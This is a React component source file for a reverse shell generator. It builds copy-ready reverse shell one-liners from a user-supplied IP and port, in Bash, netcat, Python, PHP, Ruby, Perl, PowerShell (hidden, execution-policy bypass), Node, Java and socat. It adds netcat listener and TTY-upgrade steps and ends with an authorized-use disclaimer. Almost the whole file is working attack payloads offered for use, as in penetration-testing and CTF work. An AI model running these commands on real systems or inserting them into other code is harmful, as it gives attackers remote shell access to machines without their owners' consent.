'use client'

import { Check, Copy } from 'lucide-react'
import { useEffect, useRef, useState } from 'react'

import { Button } from '@/components/ui/button'
import { Card, CardContent } from '@/components/ui/card'
import { Input } from '@/components/ui/input'
import { Separator } from '@/components/ui/separator'
import {
    Tooltip,
    TooltipContent,
    TooltipProvider,
    TooltipTrigger,
} from '@/components/ui/tooltip'

interface ShellTemplate {
    name: string
    category: string
    command: (ip: string, port: string) => string
}

const SHELLS: ShellTemplate[] = [
    {
        name: 'Bash TCP',
        category: 'Unix',
        command: (ip, port) =>
            `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
    },
    {
        name: 'Bash UDP',
        category: 'Unix',
        command: (ip, port) =>
            `bash -i >& /dev/udp/${ip}/${port} 0>&1`,
    },
    {
        name: 'sh TCP',
        category: 'Unix',
        command: (ip, port) =>
            `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
    },
    {
        name: 'Netcat (nc)',
        category: 'Unix',
        command: (ip, port) => `nc -e /bin/sh ${ip} ${port}`,
    },
    {
        name: 'Netcat (mkfifo)',
        category: 'Unix',
        command: (ip, port) =>
            `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
    },
    {
        name: 'Python 3',
        category: 'Python',
        command: (ip, port) =>
            `python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh","-i"])'`,
    },
    {
        name: 'Python 2',
        category: 'Python',
        command: (ip, port) =>
            `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    },
    {
        name: 'PHP',
        category: 'Web',
        command: (ip, port) =>
            `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    },
    {
        name: 'PHP (proc_open)',
        category: 'Web',
        command: (ip, port) =>
            `php -r '$s=fsockopen("${ip}",${port});$proc=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);'`,
    },
    {
        name: 'Ruby',
        category: 'Scripting',
        command: (ip, port) =>
            `ruby -rsocket -e 'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    },
    {
        name: 'Perl',
        category: 'Scripting',
        command: (ip, port) =>
            `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    },
    {
        name: 'PowerShell',
        category: 'Windows',
        command: (ip, port) =>
            `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
    },
    {
        name: 'PowerShell (short)',
        category: 'Windows',
        command: (ip, port) =>
            `$c=New-Object Net.Sockets.TCPClient("${ip}",${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()`,
    },
    {
        name: 'Node.js',
        category: 'JavaScript',
        command: (ip, port) =>
            `node -e "require('child_process').exec('bash -i >& /dev/tcp/${ip}/${port} 0>&1')"`,
    },
    {
        name: 'Java',
        category: 'JVM',
        command: (ip, port) =>
            `r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]);p.waitFor()`,
    },
    {
        name: 'Socat TCP',
        category: 'Unix',
        command: (ip, port) =>
            `socat TCP:${ip}:${port} EXEC:/bin/sh`,
    },
    {
        name: 'Socat PTY',
        category: 'Unix',
        command: (ip, port) =>
            `socat TCP:${ip}:${port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
    },
]

const CATEGORIES = Array.from(new Set(SHELLS.map((s) => s.category)))

export default function ReverseShellGenerator() {
    const [ip, setIp] = useState('10.10.10.10')
    const [port, setPort] = useState('4444')
    const [copied, setCopied] = useState<string | null>(null)
    const [activeCategory, setActiveCategory] = useState<string>('All')
    const ipRef = useRef<HTMLInputElement>(null)

    useEffect(() => {
        if (ipRef.current) ipRef.current.focus()
    }, [])

    useEffect(() => {
        if (copied) {
            const t = setTimeout(() => setCopied(null), 2000)
            return () => clearTimeout(t)
        }
    }, [copied])

    const copyShell = (name: string, command: string) => {
        navigator.clipboard.writeText(command)
        setCopied(name)
    }

    const filtered =
        activeCategory === 'All'
            ? SHELLS
            : SHELLS.filter((s) => s.category === activeCategory)

    const isValidIp = /^[0-9a-zA-Z.\-]+$/.test(ip) && ip.length > 0
    const isValidPort =
        /^\d+$/.test(port) && parseInt(port) > 0 && parseInt(port) <= 65535

    return (
        <div className="mx-auto max-w-3xl">
            <Card className="mb-6">
                <CardContent className="pt-6">
                    <div className="flex flex-col gap-4 sm:flex-row">
                        <div className="flex-1">
                            <label className="text-muted-foreground mb-1 block text-xs font-medium uppercase tracking-wide">
                                Listener IP / Host
                            </label>
                            <Input
                                ref={ipRef}
                                value={ip}
                                onChange={(e) => setIp(e.target.value)}
                                placeholder="10.10.10.10"
                                className="font-mono"
                                aria-label="Listener IP"
                            />
                        </div>
                        <div className="w-full sm:w-32">
                            <label className="text-muted-foreground mb-1 block text-xs font-medium uppercase tracking-wide">
                                Port
                            </label>
                            <Input
                                value={port}
                                onChange={(e) => setPort(e.target.value)}
                                placeholder="4444"
                                className="font-mono"
                                aria-label="Listener port"
                            />
                        </div>
                    </div>
                    {(!isValidIp || !isValidPort) && (ip || port) && (
                        <p className="text-destructive mt-2 text-sm">
                            {!isValidIp
                                ? 'Enter a valid IP or hostname'
                                : 'Port must be 1–65535'}
                        </p>
                    )}
                </CardContent>
            </Card>

            <div className="mb-4 flex flex-wrap gap-2">
                {['All', ...CATEGORIES].map((cat) => (
                    <Button
                        key={cat}
                        variant={activeCategory === cat ? 'default' : 'outline'}
                        size="sm"
                        onClick={() => setActiveCategory(cat)}
                    >
                        {cat}
                    </Button>
                ))}
            </div>

            <div className="space-y-3">
                {filtered.map((shell) => {
                    const command = shell.command(ip, port)
                    return (
                        <Card key={shell.name}>
                            <CardContent className="p-4">
                                <div className="mb-2 flex items-center justify-between">
                                    <div className="flex items-center gap-2">
                                        <span className="text-sm font-semibold">
                                            {shell.name}
                                        </span>
                                        <span className="bg-secondary text-muted-foreground rounded-full px-2 py-0.5 text-xs">
                                            {shell.category}
                                        </span>
                                    </div>
                                    <TooltipProvider>
                                        <Tooltip>
                                            <TooltipTrigger asChild>
                                                <Button
                                                    variant="ghost"
                                                    size="icon"
                                                    className="h-7 w-7 shrink-0"
                                                    onClick={() =>
                                                        copyShell(
                                                            shell.name,
                                                            command
                                                        )
                                                    }
                                                >
                                                    {copied === shell.name ? (
                                                        <Check className="h-3.5 w-3.5" />
                                                    ) : (
                                                        <Copy className="h-3.5 w-3.5" />
                                                    )}
                                                    <span className="sr-only">
                                                        Copy
                                                    </span>
                                                </Button>
                                            </TooltipTrigger>
                                            <TooltipContent>
                                                {copied === shell.name
                                                    ? 'Copied!'
                                                    : 'Copy'}
                                            </TooltipContent>
                                        </Tooltip>
                                    </TooltipProvider>
                                </div>
                                <div className="bg-secondary/20 overflow-x-auto rounded p-3 font-mono text-xs whitespace-pre">
                                    {command}
                                </div>
                            </CardContent>
                        </Card>
                    )
                })}
            </div>

            <Separator className="my-8" />

            <div className="mb-8">
                <h2 className="mb-4 text-xl font-semibold">Usage Notes</h2>
                <div className="grid grid-cols-1 gap-4 md:grid-cols-2">
                    <Card>
                        <CardContent className="pt-6">
                            <h3 className="mb-2 font-medium">
                                Setting Up a Listener
                            </h3>
                            <p className="text-muted-foreground mb-2 text-sm">
                                Start a netcat listener on your machine before
                                executing the shell command:
                            </p>
                            <div className="bg-secondary/20 rounded p-3 font-mono text-xs">
                                nc -lvnp {port}
                            </div>
                        </CardContent>
                    </Card>
                    <Card>
                        <CardContent className="pt-6">
                            <h3 className="mb-2 font-medium">
                                Upgrading to PTY
                            </h3>
                            <p className="text-muted-foreground mb-2 text-sm">
                                After catching a shell, upgrade to a full TTY:
                            </p>
                            <div className="bg-secondary/20 rounded p-3 font-mono text-xs whitespace-pre">{`python3 -c 'import pty;pty.spawn("/bin/bash")'
# then: Ctrl+Z
stty raw -echo; fg
export TERM=xterm`}</div>
                        </CardContent>
                    </Card>
                    <Card className="md:col-span-2">
                        <CardContent className="pt-6">
                            <h3 className="mb-2 font-medium text-amber-500">
                                Authorized Use Only
                            </h3>
                            <p className="text-muted-foreground text-sm">
                                This tool is intended for{' '}
                                <strong>authorized penetration testing</strong>,
                                CTF competitions, and security research on
                                systems you own or have explicit written
                                permission to test. Unauthorized use against
                                systems you do not own is illegal.
                            </p>
                        </CardContent>
                    </Card>
                </div>
            </div>
        </div>
    )
}
